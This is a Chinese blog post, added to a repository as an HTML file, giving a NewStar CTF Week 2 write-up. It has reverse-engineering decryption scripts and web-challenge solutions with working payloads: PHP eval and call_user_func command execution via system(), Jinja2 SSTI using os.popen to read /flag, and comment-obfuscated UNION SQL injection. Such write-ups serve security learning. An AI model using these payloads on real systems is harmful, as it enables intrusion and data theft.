@@ -1,0 +1,504 @@
+
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8" />
+    <title>CtfNewStar Week2 Writeup | huanghunr&#39;s blog</title>
+    <meta name="author" content="John Doe" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/tx%20%283%29.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>HUANGHUNR&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-home fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;关于huanghunr</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;归档</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;分类</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;标签</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;HUANGHUNR&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-home fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">关于huanghunr</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">归档</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">分类</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">标签</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>CtfNewStar Week2 Writeup</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/10/23
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="drink-tea"><a href="#drink-tea" class="headerlink" title="drink_tea"></a>drink_tea</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路:"></a>思路:</h3><p>查壳后丢进ida，在main函数中发现加密函数，密钥和加密后的密文。分析加密函数，发现tea加密的特征deltea值，于是把密钥的值按d变为dd形式的数据，拿到4个密钥，然后提取出密文写脚本解密，把加密过程反过来就行。脚本如下。  </p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+
+int __fastcall dec(unsigned int* input, unsigned int* key_1);
+
+int main() &#123;
+   unsigned char m[32] = &#123;
+        0x78, 0x20, 0xF7, 0xB3, 0xC5, 0x42, 0xCE, 0xDA,
+        0x85, 0x59, 0x21, 0x1A, 0x26, 0x56, 0x5A, 0x59,
+        0x29, 0x02, 0x0D, 0xED, 0x07, 0xA8, 0xB9, 0xEE,
+        0x36, 0x59, 0x11, 0x87, 0xFD, 0x5C, 0x23, 0x24
+    &#125;;
+    unsigned int key[4] = &#123;0x636C6557, 0x54656D6F, 0x77654E6F, 0x72617453&#125;; 
+
+    for (int i = 0; i &lt; 32; i += 8) &#123;
+        dec((unsigned int*)&amp;m[i],key);
+    &#125;
+
+    for (int i = 0; i &lt; 32; i++) &#123;
+        printf(&quot;%c&quot;, m[i]); 
+    &#125;
+    return 0;
+&#125;
+
+int __fastcall dec(unsigned int* input, unsigned int* key_1)
+&#123;
+    __int64 result; 
+    unsigned int input2; 
+    unsigned int input_add2; 
+    int delta; 
+unsigned int i; 
+
+    input2 = *input;
+    input_add2 = input[1];
+    delta = -1640531527 * 32;
+
+    for (i = 0; i &lt; 0x20; ++i)
+    &#123;
+        input_add2 -= (key_1[3] + (input2 &gt;&gt; 5)) ^ (delta + input2) ^ (key_1[2] + 16 * input2);
+        input2 -= (key_1[1] + (input_add2 &gt;&gt; 5)) ^ (delta + input_add2) ^ (*key_1 + 16 * input_add2);
+        delta += 1640531527; 
+    &#125;
+    *input = input2;
+    input[1] = input_add2;
+    return 0;
+&#125;  
+</code></pre>
+<hr>
+<h2 id="Dirty-flowers"><a href="#Dirty-flowers" class="headerlink" title="Dirty_flowers"></a>Dirty_flowers</h2><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>查壳后丢进ida32，提示花指令。发现有两处爆红，发现是以call和ret构造的花指令，直接nop掉，在函数入口处按u后再按p，就可以编译了。在main函数中发现了加密函数和key，于是直接写脚本解密。脚本如下（不知道为什么编译器识别密钥有13位，其实数下来就12位），输出结果就是flag</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+
+int main() &#123;
+    int v3[36] = &#123; 0 &#125;;
+    v3[0] = 2;
+    v3[1] = 5;
+    v3[2] = 19;
+    v3[3] = 19;
+    v3[4] = 2;
+    v3[5] = 30;
+    v3[6] = 83;
+    v3[7] = 31;
+    v3[8] = 92;
+    v3[9] = 26;
+    v3[10] = 39;
+    v3[11] = 67;
+    v3[12] = 29;
+    v3[13] = 54;
+    v3[14] = 67;
+    v3[15] = 7;
+    v3[16] = 38;
+    v3[17] = 45;
+    v3[18] = 85;
+    v3[19] = 13;
+    v3[20] = 3;
+    v3[21] = 27;
+    v3[22] = 28;
+    v3[23] = 45;
+    v3[24] = 2;
+    v3[25] = 28;
+    v3[26] = 28;
+    v3[27] = 48;
+    v3[28] = 56;
+    v3[29] = 50;
+    v3[30] = 85;
+    v3[31] = 2;
+    v3[32] = 27;
+    v3[33] = 22;
+    v3[34] = 84;
+    v3[35] = 15;
+
+    char key[] = &quot;dirty_flower&quot;;
+    int len = 12;
+    for (int i = 0; i &lt; 36; i++)
+    &#123;
+        int a = i % len;
+        v3[i] ^= key[a];
+    &#125;
+    for (int i = 0; i &lt; 36; i++) &#123;
+        printf(&quot;%c&quot;, v3[i]);
+    &#125;
+&#125;
+</code></pre>
+<hr>
+<h2 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h2><h3 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h3><p>用die查看发现带壳，于是用upx脱壳，丢入ida,发现RC4加密函数。还有密钥，发现密文data为空，于是用linux进行调试，在比较处断点，发现data的值，这样就得到了密文。想了一下决定用网站进行解密，于是把密钥先转化成十进制（脚本如下），把输出结果用<a target="_blank" rel="noopener" href="https://gs.jisuanla.com/decimal-to-ascii.html%E8%BD%AC%E5%8C%96%E4%B8%BAascii%E7%A0%81%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%9B%E8%A1%8Cbase64%E7%BC%96%E7%A0%81%EF%BC%8C%E6%9C%80%E5%90%8E%E7%94%A8%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86https://www.mklab.cn/utils/rc4%E3%80%82">https://gs.jisuanla.com/decimal-to-ascii.html转化为ascii码，然后进行base64编码，最后用在线网站进行解密https://www.mklab.cn/utils/rc4。</a>  </p>
+<p>flag{Do_you_know_UPX?}  </p>
+<pre><code class="c">#include&lt;stdio.h&gt;
+
+int main() &#123;
+    unsigned char data[23] = &#123;
+    0xC4, 0x60, 0xAF, 0xB9, 0xE3, 0xFF, 0x2E, 0x9B, 0xF5, 0x10, 0x56, 0x51, 0x6E, 0xEE, 0x5F, 0x7D,
+    0x7D, 0x6E, 0x2B, 0x9C, 0x75, 0xB5 &#125;;
+   
+    
+    
+    for (int i = 0; i &lt; 22; i++) &#123;
+        printf(&quot;%d,&quot;, data[i]);
+    &#125;
+    
+&#125;
+</code></pre>
+<hr>
+<h2 id="Ezencrypt"><a href="#Ezencrypt" class="headerlink" title="Ezencrypt"></a>Ezencrypt</h2><h3 id="思路：-2"><a href="#思路：-2" class="headerlink" title="思路："></a>思路：</h3><p>先找到main函数，发现里面对输入得数据进行了加密。仔细分析，明文tx被Enc函数加密，然后调用enc中得check方法对密文进行检验。在Enc中我们发现明文先是被AES加密再用base64编码，然后在调用check时，加密后的密文又被传入一个位于native的doEncCheck的函数中。所以提取so文件在ida中查看。在ida中我们发现了doEncCheck函数，但是它先调用了一个enc函数与密钥进行了简单的异或，然后enc函数最后又调用了一个encc函数，分析encc函数发现类似于RC4加密，密钥与enc相同，最后再由doEncCheck函数把加密后的密文与正确的密文进行比对返回结果。<br>所以解密顺序就是先解密encc然后是enc再是AES，脚本如下，输出的是被base64编码的被AES加密的密。<br>进行AES解密，能看到密钥被放在了MainActivity.title里面，用<a target="_blank" rel="noopener" href="https://www.mklab.cn/utils/aes%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86%EF%BC%8C%E5%BE%97%E5%88%B0%E7%BB%93%E6%9E%9C%E5%B0%B1%E6%98%AFflag%E3%80%82">https://www.mklab.cn/utils/aes进行解密，得到结果就是flag。</a>  </p>
+<p>flag{0hh_U_kn0w_7h15_5ki11}</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+
+const char* init_sbox(const char* key);
+unsigned long encc(char* key, char* input);
+__int64 __fastcall enc(char* input);
+
+unsigned char sbox[256];
+unsigned char key[4] = &quot;meow&quot;;
+
+int main() &#123;
+    
+    unsigned char input[] = &#123; 0xC2, 0x6C, 0x73, 0xF4, 0x3A, 0x45, 0x0E, 0xBA, 0x47, 0x81, 0x2A, 0x26, 0xF6, 0x79, 0x60, 0x78,
+    0xB3, 0x64, 0x6D, 0xDC, 0xC9, 0x04, 0x32, 0x3B, 0x9F, 0x32, 0x95, 0x60, 0xEE, 0x82, 0x97, 0xE7,
+    0xCA, 0x3D, 0xAA, 0x95, 0x76, 0xC5, 0x9B, 0x1D, 0x89, 0xDB, 0x98, 0x5D &#125;;
+    
+    init_sbox(key);
+    encc(key, input);
+    enc(input);
+    for (int i = 0; i &lt; 44; i++) &#123;
+        printf(&quot;%c&quot;, input[i]);
+    &#125;
+
+&#125;
+__int64 __fastcall enc(char* input)
+&#123;
+    signed int i; // [xsp+0h] [xbp-20h]
+    signed int v3; // [xsp+4h] [xbp-1Ch]
+
+    v3 = 44;
+    for (i = 0; i &lt; v3; ++i)
+        input[i] ^= key[i % 4];
+    return 0;
+&#125;
+const char* init_sbox(const char* key) &#123;
+    int v1;                 
+    unsigned int v2 = 0;     
+    unsigned int v3 = 0;     
+    unsigned int i, j;       
+    size_t key_length;      
+
+    key_length = strlen(key);
+
+    for (i = 0; i &lt; 256; ++i) &#123;
+        sbox[i] = i;
+    &#125;
+
+    for (j = 0; j &lt; 256; ++j) &#123;
+        v1 = sbox[j];
+        v3 = (v3 + v1 + (unsigned char)key[v2]) % 256;
+        sbox[j] = sbox[v3];
+        sbox[v3] = v1;
+        ++v2;
+        if (v2 &gt;= key_length) &#123;
+            v2 = 0;
+        &#125;
+    &#125;
+
+    return key;
+&#125;
+unsigned long encc(char* key, char* input) &#123;
+    unsigned long result;
+    unsigned char v3;
+    int v4 = 0;
+    int v5 = 0;
+    int i;
+    result = 44;
+    for (i = 0; i &lt; result; ++i) &#123;
+        v5 = (v5 + 1) % 256;
+        v4 = (v4 + sbox[v5]) % 256;
+
+        v3 = sbox[v5];
+        sbox[v5] = sbox[v4];
+        sbox[v4] = v3;
+
+        input[i] ^= sbox[(sbox[v5] + sbox[v4]) % 256];
+    &#125;
+    return result;
+&#125;
+</code></pre>
+<hr>
+<h2 id="Pangbai泰拉记（1）"><a href="#Pangbai泰拉记（1）" class="headerlink" title="Pangbai泰拉记（1）"></a>Pangbai泰拉记（1）</h2><h3 id="思路：-3"><a href="#思路：-3" class="headerlink" title="思路："></a>思路：</h3><p>Die查壳后丢入ida，看到了一堆混淆，f5查看main函数，分析一下看到提示用调试获得flag，还发现flag与key进行了异或，看了下key和flag的值后直接启动调试，此时再看key的值发生了变化，而flag的值也是假的，尝试用没调试时的key解flag，发现也是不行。<br>想了一下，可能是调试状态的改变使flag和key的值不正确（main函数前面有个检测调试，虽然改变变量的函数没在main里被调用，但是在main函数执行前还有许多的函数会先被调用），所以看异或前两个的值，发现flag的值不变，但是key的值是已经变化了，于是按x找到调用key的函数。<br>发现key在一个main0的函数中被进行了异或操作，在if判断了是否为调试之类的，然后把key与的两种不同的值进行异或。于是在if的jz处下断点，调试到这里发现ZF的值为0，输出的就是一开始调试的key，所以我们改变ZF的值为1，让key为正确的密钥。<br>此时在主函数的结束处下断点便于查看flag的值，运行到此直接查看flag的值，按a转为字符串，这就是真的flag了。</p>
+<hr>
+<h2 id="Ptrace"><a href="#Ptrace" class="headerlink" title="Ptrace"></a>Ptrace</h2><h3 id="思路：-4"><a href="#思路：-4" class="headerlink" title="思路："></a>思路：</h3><p>题目提示ptrace，发现了father和son两个文件，die查了后用ida分析。<br>先看father，在main函数中我们发现，他先是创建了一个子进程，然后根据fork函数的特性，子进程打开了名为son的可执行文件，而父进程则监控着子进程，并对子进程传入了一个为3的参数，而后父进程就等待子进程的执行完成，程序结束。<br>在子进程中我们发现了一个加密函数，把我们输入的s进行了|运算，并与mm判断是否相等。<br>这时的我们拿到了密文和加密方法，所以直接写脚本解密就行,注意偏移的值是父进程传入的3(猜的)，脚本如下，输出的结果就是flag<br>flag{Do_you_really_know_ptrace?}</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+
+unsigned char m[32] = &#123;
+ 0xCC, 0x8D, 0x2C, 0xEC, 0x6F, 0x88, 0xED, 0xEB, 0x2F, 0xED, 0xAE, 0xEB, 0x4E, 0xAC, 0x2C, 0x8D,
+ 0x8D, 0x2F, 0xEB, 0x6D, 0xCD, 0xED, 0xEE, 0xEB, 0x0E, 0x8E, 0x4E, 0x2C, 0x6C, 0xAC, 0xE7, 0xAF
+ &#125;;
+void dec(const unsigned char* m, unsigned char* flag) &#123;
+    for (int i = 0; i &lt; 32; ++i) &#123;
+        flag[i] = (m[i] &lt;&lt; 3) | (m[i] &gt;&gt; (8 - 3));
+    &#125;
+&#125;
+int main() 
+&#123;
+    unsigned char flag[32];
+    dec(m, flag);
+    printf(&quot;%s&quot;, flag);
+
+    return 0;
+&#125;
+</code></pre>
+<hr>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="你能在一秒内打出八句英文吗"><a href="#你能在一秒内打出八句英文吗" class="headerlink" title="你能在一秒内打出八句英文吗"></a>你能在一秒内打出八句英文吗</h2><h3 id="思路：-5"><a href="#思路：-5" class="headerlink" title="思路："></a>思路：</h3><p>开始是先想着用brup抓时间点的包进行post的，查看了源码后发现它记录的是开始的时间戳，而且一些快捷键被禁用了。所以没有办法只能让虫虫来帮我完成这次任务了。虫虫就在下面。<br>Url1就是开始的页面，url2是在源码中发现的提交时post内容的页面。同时发现提交时的cookie记录了时间戳，所以cookie也要传递到url2。然后在查看源码后定位要输入的英文的位置，获取并以post的方式提交给url2。运行后就可以得到flag。</p>
+<pre><code class="py">import requests
+from bs4 import BeautifulSoup
+
+url1 = &#39;....../start&#39;
+url2 = &#39;....../submit&#39;
+
+import requests
+from bs4 import BeautifulSoup
+
+with requests.Session() as session:
+    response1 = session.get(url1)
+    soup = BeautifulSoup(response1.text, &#39;html.parser&#39;)
+    container_div = soup.find(&#39;div&#39;, &#123;&#39;class&#39;: &#39;container&#39;&#125;)
+    text_p = container_div.find(&#39;p&#39;, &#123;&#39;id&#39;: &#39;text&#39;&#125;)
+    text_content = text_p.text.strip()
+    post_data = &#123;
+        &#39;user_input&#39;: text_content,
+    &#125;
+    response2 = session.post(url2, data=post_data)
+
+    print(response2.status_code)
+</code></pre>
+<hr>
+<h2 id="遗失的拉链"><a href="#遗失的拉链" class="headerlink" title="遗失的拉链"></a>遗失的拉链</h2><h3 id="思路：-6"><a href="#思路：-6" class="headerlink" title="思路："></a>思路：</h3><p>提示找东西，源代码和请求头看了都没收获，尝试目录扫描，在linux进行扫描，发现网站备份文件<a target="_blank" rel="noopener" href="http://www.zip,直接输入下载到本地,发现有个pizwww.php的文件/">www.zip，直接输入下载到本地，发现有个pizwww.php的文件</a><br>转到piz<a target="_blank" rel="noopener" href="http://www.php目录下,按照下载的php文件进行传参,要求我们get一个new的参数和post一个star的参数,要求两个数据不相等但是shal和md5强相等,直接数组绕过,然后再post参数给cmd让eval()函数执行,同时发现cmd被过滤了flag和cat./">www.php目录下，按照下载的php文件进行传参，要求我们get一个new的参数和post一个star的参数，要求两个数据不相等但是shal和MD5强相等，直接数组绕过，然后再post参数给cmd让eval()函数执行，同时发现cmd被过滤了flag和cat。</a><br>不过先执行ls &#x2F;看一下flag的位置，&#x2F;piz<a target="_blank" rel="noopener" href="http://www.php/?new%5B%5D=2121%EF%BC%8CPOST">www.php/?new[]=2121，POST</a> star[]&#x3D;adssds&amp;cmd&#x3D;system(“ls &#x2F;“);，发现一个flag的文件，想到用tac作为读取命令，用f<em>进行读取POST star[]&#x3D;adssds&amp;cmd&#x3D;system(“tac &#x2F;f</em>“);直接拿到flag。<br>flag{e1b4e109-b24e-4301-b4a0-473153f473c0}</p>
+<hr>
+<h2 id="pangbai过家家-2"><a href="#pangbai过家家-2" class="headerlink" title="pangbai过家家(2)"></a>pangbai过家家(2)</h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路:"></a>思路:</h3><p>根据剧情得到提示“泄露”，推测是git泄露，于是先用dirsearch扫描目录，发现了许多git文件，确定是git泄露，于是用githack获取git文件。<br>在目录里也没看到什么东西，git log一下也没看出什么，后面想想直接恢复历史版本看一下有没有不同的文件，执行git stash pop，发现有一个叫 BacKd0or.v2d23AOPpDfEW5Ca.php的文件非常可疑于是把这个文件恢复过来看看。dit add BacKd0or.v2d23AOPpDfEW5Ca.php。<br>打开文件发现这就是剧情中的后门，分析代码，发现需要我们POST一个papa的为TfflxoU0ry7c，后再get一个NewStar_CTF.2024的值不能为Welcome但是正则匹配又要是Welcome，这里想到用换行符进行绕过，同时还要注意因为php的传参规则会把.这类符号转换为下划线导致传参错误，但是在存在”[“时，php只会把”[“转化为”_”，而后面的并不变，所以我们要把第一个下划线改成”[“。<br>在满足上面条件后我们就可以给call_user_func()函数POST两个参数分别是func为要执行的函数名，arry为函数的参数，这里想到system函数来执行linux系统命令。<br>刚开始用ls查看文件硬是没有找到flag。后来问学长得知flag还可能藏在环境变量里于用env查看环境变量，flag就在里面。<br>最终传参：&#x2F;BacKd0or.v2d23AOPpDfEW5Ca.php&#x2F;?NewStar[CTF.2024&#x3D;Welcome%0a<br>POST papa&#x3D;TfflxoU0ry7c&amp;func&#x3D;system&amp;args&#x3D;env<br>flag{528f729b-f0c2-4089-86d5-af868a1b736d}</p>
+<hr>
+<h2 id="复读机"><a href="#复读机" class="headerlink" title="复读机!"></a>复读机!</h2><h3 id="思路：-7"><a href="#思路：-7" class="headerlink" title="思路："></a>思路：</h3><p>一开始真不知道这是啥玩意，看了官方参考文档，发现是SSTI，尝试输入2，得到2的结果，到此确定是ssti.于是在网上了解了一下并找了一些用内敛函数构成的可以执行系统命令的playload。  </p>
+<pre><code class="py">&#123;&#123;"".__class__.__base__.__subclasses__()[142].__init__.__globals__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=popen&amp;arg2=ls
+</code></pre>
+<p>像上面这类的命令好像被过滤了，提示bot不喜欢上课，推测是class不能有，所以去找一下不带class的playload。<br>最后发现</p>
+<pre><code class="py">&#123;&#123;url_for.__globals__['os'].popen('ls /').read()&#125;&#125;最简洁好用，先寻找flag的位置，发现就在/目录下，于是直接cat /flag。  
+</code></pre>
+<p>最终playload: </p>
+<pre><code class="py">&#123;&#123;url_for.__globals__['os'].popen('cat /flag').read()&#125;&#125;
+</code></pre>
+<hr>
+<h2 id="谢谢皮蛋plus"><a href="#谢谢皮蛋plus" class="headerlink" title="谢谢皮蛋plus"></a>谢谢皮蛋plus</h2><h3 id="思路：-8"><a href="#思路：-8" class="headerlink" title="思路："></a>思路：</h3><p>先用or来查看包裹数据的情况，输入1可以查询到内容，于是输入-1 or 1 &#x3D;1;#,发现有字符触发了过滤于是用||代替or，还是不行推测可能是空格，所以输入了1 1，发现被过滤，确定就是空格，想到用&#x2F;<strong>&#x2F;代替空格，但是手动输入有点麻烦于是写了个脚本把空格转换为&#x2F;</strong>&#x2F;(脚本如下)，于是输入-1&#x2F;<strong>&#x2F;or&#x2F;</strong>&#x2F;1&#x3D;1;#，发现没有回显结果（估计是没有报错显示），后输入-1”&#x2F;<strong>&#x2F;or&#x2F;</strong>&#x2F;1&#x3D;1;#，发现可以正常查询到结果了，根据返回的两个值看推测查询的是两个列的内容。<br>于是基于此构造联合查询，</p>
+<pre><code class="s">-1&quot;/**/UNION/**/SELECT/**/1,GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA=database();#
+</code></pre>
+<p>查到Fl4g的表名</p>
+<pre><code class="s">-1”/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns;#
+</code></pre>
+<p>查到列名<br>根据week1的思路估计又在value里面，所以直接输入</p>
+<pre><code class="s">-1&quot;/**/union/**/select/**/1,value/**/from/**/Fl4g;#
+</code></pre>
+<p>得到的就是flag</p>
+<pre><code class="py">def replace(str):
+    pstr = str.replace(&quot; &quot;, &quot;/**/&quot;)
+    return pstr
+
+
+str = &quot;&quot;   #输入字符串
+pstr = replace(str)
+print(pstr)
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 huanghunr&#39;s blog
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;John Doe
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
